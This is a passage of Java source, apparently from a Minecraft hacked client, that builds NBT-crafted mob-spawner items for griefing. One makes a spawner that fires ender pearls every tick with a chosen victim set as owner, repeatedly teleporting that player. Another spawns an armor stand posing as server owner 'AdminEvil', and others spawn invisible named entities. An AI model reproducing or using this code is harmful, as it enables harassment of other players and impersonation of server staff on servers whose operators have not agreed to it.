        Equipment.appendTag(JsonToNBT.getTagFromJson("{id:\"skull\",Count:1b,Damage:3b,tag:{SkullOwner:{Id:\"96179689-3fb2-4143-be50-eb049a016bc8\",Properties:{textures:[{Value:\"eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6Imh0dHA6Ly90ZXh0dXJlcy5taW5lY3JhZnQubmV0L3RleHR1cmUvOWIzYjFmNzg1ZjAxNzUzYzQ1ZWY5N2ZjZmZmZmIzZjUyNjU4ZmZjZWIxN2FkM2Y3YjU5Mjk0NWM2ZGYyZmEifX19\"}]}}}}"));
        SpawnData.setInteger("Invisible", 1);
        SpawnData.setString("CustomName", "\u00a73Kacke");
        SpawnData.setInteger("CustomNameVisible", 1);
        SpawnData.setTag("Equipment", Equipment);
        BlockEntityTag.setTag("SpawnData", SpawnData);
        base.setTag("BlockEntityTag", BlockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    public static ItemStack getRunningAdminEvil() throws NBTException {
        ItemStack itm = new ItemStack(Blocks.mob_spawner, 1, 0);
        itm.setTagCompound(JsonToNBT.getTagFromJson("{BlockEntityTag:{EntityId:ArmorStand,SpawnData:{CustomName:\"\u00a74\u00a7lOwner AdminEvil\",CustomNameVisible:1,ShowArms:1,NoBasePlate:1,Equipment:[{id:command_block,Count:1},{id:diamond_boots,Count:1},{id:diamond_leggings,Count:1},{id:diamond_chestplate,Count:1},{id:skull,Damage:3,Count:1,tag:{SkullOwner:AdminEvil}}],Riding:{id:\"Silverfish\",ActiveEffects:[{Id:14,Amplifier:0,Duration:19999980,ShowParticles:0b}]}}}}"));
        return itm;
    }

    public static ItemStack getPlayerSwirler(String player, double x, double y, double z) {
        ItemStack itm = new ItemStack(Blocks.mob_spawner, 1, 0);
        NBTTagCompound base = new NBTTagCompound();
        NBTTagCompound blockEntityTag = new NBTTagCompound();
        blockEntityTag.setString("EntityId", "ThrownEnderpearl");
        blockEntityTag.setInteger("SpawnCount", 1);
        blockEntityTag.setInteger("SpawnRange", 20);
        blockEntityTag.setInteger("RequiredPlayerRange", 500);
        blockEntityTag.setInteger("MinSpawnDelay", 1);
        blockEntityTag.setInteger("MaxSpawnDelay", 1);
        blockEntityTag.setInteger("Delay", 1);
        blockEntityTag.setInteger("MaxNearbyEntities", 100);
        NBTTagCompound spawnData = new NBTTagCompound();
        spawnData.setInteger("Invulnerable", 1);
        spawnData.setByte("shake", (byte)0);
        spawnData.setString("ownerName", player);
        NBTTagList Motion = new NBTTagList();
        Motion.appendTag(new NBTTagDouble(x));
        Motion.appendTag(new NBTTagDouble(y));
        Motion.appendTag(new NBTTagDouble(z));
        spawnData.setTag("Motion", Motion);
        blockEntityTag.setTag("SpawnData", spawnData);
        base.setTag("BlockEntityTag", blockEntityTag);
        itm.setTagCompound(base);
        return itm;
    }

    private static ItemStack createSplashBase() {
        ItemStack stack = new ItemStack(Items.potionitem);
        stack.setItemDamage(16384);
        return stack;
    }

    private static String getSpaces() {
        String result = "";
        for (int i = 0; i < 500; ++i) {
            result = result + " ";
        }
        return result;
    }
}


